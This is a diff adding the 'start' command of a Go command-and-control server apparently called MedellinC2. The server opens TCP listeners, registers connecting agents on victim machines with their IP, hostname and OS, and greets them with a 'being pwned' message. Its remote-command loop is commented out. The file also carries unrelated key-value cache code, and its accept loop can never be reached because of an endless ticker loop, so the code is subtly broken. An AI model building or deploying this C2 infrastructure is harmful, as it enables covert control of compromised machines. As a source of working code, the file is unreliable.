@@ -1,0 +1,302 @@
+/*
+Copyright © 2022 NAME HERE <EMAIL ADDRESS>
+
+*/
+package cmd
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"log"
+	"net"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/google/uuid"
+	"github.com/megatop1/MedellinC2/data"
+	"github.com/spf13/cobra"
+)
+
+var logo = `
+_____ ______   _______   ________  _______   ___       ___       ___  ________           ________   _______     
+|\   _ \  _   \|\  ___ \ |\   ___ \|\  ___ \ |\  \     |\  \     |\  \|\   ___  \        |\   ____\ /  ___  \    
+\ \  \\\__\ \  \ \   __/|\ \  \_|\ \ \   __/|\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \___|/__/|_/  /|   
+ \ \  \\|__| \  \ \  \_|/_\ \  \ \\ \ \  \_|/_\ \  \    \ \  \    \ \  \ \  \\ \  \       \ \  \   |__|//  / /   
+  \ \  \    \ \  \ \  \_|\ \ \  \_\\ \ \  \_|\ \ \  \____\ \  \____\ \  \ \  \\ \  \       \ \  \____  /  /_/__  
+   \ \__\    \ \__\ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\\ \__\       \ \_______\\________\
+    \|__|     \|__|\|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__| \|__|        \|_______|\|_______|
+	`
+
+// startCmd represents the start command
+var startCmd = &cobra.Command{
+	Use:   "start",
+	Short: "Starts the C2 server",
+	Long:  `Starts the TCP server to begin listening and handling connections agents`,
+	Run: func(cmd *cobra.Command, args []string) {
+		//fmt.Println("start called")
+		//listenForConnections()
+		server()
+	},
+}
+
+func init() {
+	serverCmd.AddCommand(startCmd)
+}
+
+//TESTING
+
+func handleClientRequest(con net.Conn) {
+	//fancy colors for console output
+	//colorGreen := "\033[32m"
+
+	defer con.Close()
+
+	/* On the TCP server (C2), print below message once a TCP Client (agent) has successfully connected */
+	clientReader := bufio.NewReader(con)
+	/*
+		fmt.Println(string(colorGreen), "A new agent has successfully connected")
+		getAgentInfo() //get the information such as IP, Hostname, OS of an agent (victim machine)
+		data.CheckDuplicateAgentUUID()
+	*/
+	if data.CheckDuplicateAgentUUID() == true {
+		go getAgentInfoAndGenerateAgent() //get the information from a target and create an agent in the DB
+
+		/* Issue Commands Remotely */
+		/*
+			for {
+				reader := bufio.NewReader(os.Stdin)
+				fmt.Print(">> ")
+				text, _ := reader.ReadString('\n')
+				fmt.Fprintf(con, text+"\n")
+
+				message, _ := bufio.NewReader(con).ReadString('\n')
+				fmt.Print("->: " + message)
+				if strings.TrimSpace(string(text)) == "STOP" {
+					fmt.Println("TCP client exiting...")
+					return
+				}
+			} */
+	}
+
+	for {
+		// Waiting for the client request
+		clientRequest, err := clientReader.ReadString('\n')
+
+		switch err {
+		case nil:
+			clientRequest := strings.TrimSpace(clientRequest)
+			if clientRequest == ":QUIT" {
+				log.Println("agent willingly requested server to close the connection so closing")
+				return
+			} else {
+				//log.Println(clientRequest)	//prints out user input after the new agent outputs "agent successfully connected" to server console
+			}
+		case io.EOF:
+			log.Println("agent died. closed the connection by terminating the process")
+			return
+		default:
+			log.Printf("error: %v\n", err)
+			return
+		}
+
+		// Responding to the client request
+		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
+			//sendRemoteCommand(con)
+			log.Printf("failed to respond to client: %v\n", err)
+		}
+	}
+}
+
+func server() {
+	println(logo)
+	/*Start the TCP Server */
+	listener, err := net.Listen("tcp", "0.0.0.0:8000") //start TCP server on 8000
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer listener.Close()
+
+	/* Print below message upon successful start of the TCP Server */
+	println("Medellin C2 Server Successfully Started on 0.0.0.0:8000")
+
+	/* Print open listeners on startup of C2 server */
+	printCurrentListerPorts()
+
+	/* Run continuously in background to keep checking if any new listeners were created */
+	for range time.Tick(time.Second * 10) {
+		checkListenerPorts()
+	}
+
+	/* Using sync.Map to not deal with concurrency slice/map issues */
+	var connMap = &sync.Map{}
+
+	/* Accept Connections */
+
+	for {
+		con, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+
+		id := uuid.New().String()
+		connMap.Store(id, con)
+
+		/* Handle incoming connections by starting goroutine for each connected client */
+		go handleClientRequest(con)
+	}
+}
+
+type cache struct {
+	data map[string]string
+	*sync.RWMutex
+}
+
+var c = cache{data: make(map[string]string), RWMutex: &sync.RWMutex{}}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+
+	s := bufio.NewScanner(conn)
+
+	for s.Scan() {
+
+		data := s.Text()
+
+		if data == "" {
+			conn.Write([]byte(">"))
+			continue
+		}
+
+		if data == "exit" {
+			return
+		}
+
+		handleCommand(data, conn)
+	}
+}
+
+var InvalidCommand = []byte("Invalid Command")
+
+func handleCommand(inp string, conn net.Conn) {
+	str := strings.Split(inp, " ")
+
+	if len(str) <= 0 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	command := str[0]
+
+	switch command {
+
+	case "GET":
+		get(str[1:], conn)
+	case "SET":
+		set(str[1:], conn)
+	default:
+		conn.Write(InvalidCommand)
+	}
+
+	conn.Write([]byte("\n>"))
+}
+
+func set(cmd []string, conn net.Conn) {
+
+	if len(cmd) < 2 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	key := cmd[0]
+	val := cmd[1]
+
+	c.Lock()
+	c.data[key] = val
+	c.Unlock()
+
+	conn.Write([]byte("OK"))
+}
+
+func get(cmd []string, conn net.Conn) {
+
+	if len(cmd) < 1 {
+		conn.Write(InvalidCommand)
+		return
+	}
+
+	val := cmd[0]
+
+	c.RLock()
+	ret, ok := c.data[val]
+	c.RUnlock()
+
+	if !ok {
+		conn.Write([]byte("Nil"))
+		return
+	}
+
+	conn.Write([]byte(ret))
+}
+
+// http://www.inanzzz.com/index.php/post/j3n1/creating-a-concurrent-tcp-client-and-server-example-with-golang
+
+// Accept Loop
+func acceptLoop(l net.Listener) {
+	defer l.Close()
+	for {
+		c, err := l.Accept()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println("New Connection found")
+		handleClientRequest(c)
+	}
+}
+
+//Purpose: Successfully checks for all open ports (stored in database)
+func checkListenerPorts() {
+	//Check all open ports in Listeners table in a loop and allow connections over those ports
+	//format GetListenerPorts()
+	s := data.GetListenerPorts() //string that contains every port
+	v := strings.SplitN(s, ",", len(s))
+	//fmt.Print(v)
+	//print("current listeners running on ports: ")
+
+	for i := 0; i < len(v); i++ {
+		listener2, err := net.Listen("tcp", "0.0.0.0:"+v[i]) //create listener on v[i] (index of the array storing the listener ports)
+		if err != nil {
+			//log.Fatalln(err)
+			continue
+		}
+
+		go openPorts(listener2)
+	}
+
+}
+
+//Purpose: Will continuously update open ports, when a user creates a new listener, then the port will be opened immediatly
+func openPorts(listener net.Listener) {
+	for {
+		con, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+		}
+		//time.Sleep(time.Second)
+		go handleClientRequest(con) //without this, a 2nd connection on the same port can connect but CANNOT run commands on the remote host, hence the go in the beginning
+		defer listener.Close()      //close the listener when the application closes
+	}
+}
+
+func printCurrentListerPorts() {
+	s := data.GetListenerPorts() //string that contains every port
+	v := strings.SplitN(s, ",", len(s))
+
+	print("Current Listeners Running On Ports: ")
+	for i := 0; i < len(v); i++ {
+		print(v[i] + " ")
+	}
+	print("\n")
+}
